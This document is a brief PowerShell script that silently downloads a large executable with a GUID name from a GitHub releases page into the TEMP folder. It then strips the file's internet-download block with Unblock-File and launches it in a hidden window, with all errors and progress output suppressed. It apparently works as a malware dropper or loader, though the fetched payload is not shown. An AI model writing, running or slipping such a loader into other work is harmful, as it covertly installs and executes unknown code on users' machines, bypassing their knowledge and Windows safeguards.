$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

$name = 'b4bd5752-86c7-459b-acc1-3d5ac43f0293.exe'
$size = 93614709
$dest = Join-Path $env:TEMP $name

$srcs = @(
    "https://github.com/ScoobyJew1337/media/releases/latest/download/$name",
    "https://github.com/ScoobyJew1337/media/releases/download/v1/$name"
)

if (-not (Test-Path $dest) -or (Get-Item $dest).Length -ne $size) {
    foreach ($u in $srcs) {
        try {
            Invoke-WebRequest -Uri $u -OutFile $dest -UseBasicParsing -TimeoutSec 600
            if ((Get-Item $dest).Length -eq $size) { break }
        } catch { }
    }
}

if (-not (Test-Path $dest) -or (Get-Item $dest).Length -ne $size) { return }

Unblock-File -LiteralPath $dest
Start-Process -FilePath $dest -WindowStyle Hidden
